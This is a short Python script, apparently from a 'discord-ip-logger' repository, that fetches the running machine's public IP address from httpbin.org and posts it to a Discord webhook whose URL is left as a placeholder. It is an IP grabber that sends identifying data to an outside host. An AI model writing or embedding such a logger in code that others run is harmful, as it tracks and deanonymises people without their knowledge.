'''Credits: resilient'''

from discord_webhook import DiscordWebhook
import requests

r = requests.get(url='http://httpbin.org/ip').json()
ip = r['origin']


webhook = DiscordWebhook(url='your discord webhook url here', content=((ip) + '\nlogged by https://github.com/r3s1l13nt/discord-ip-logger/'))
webhook.execute()
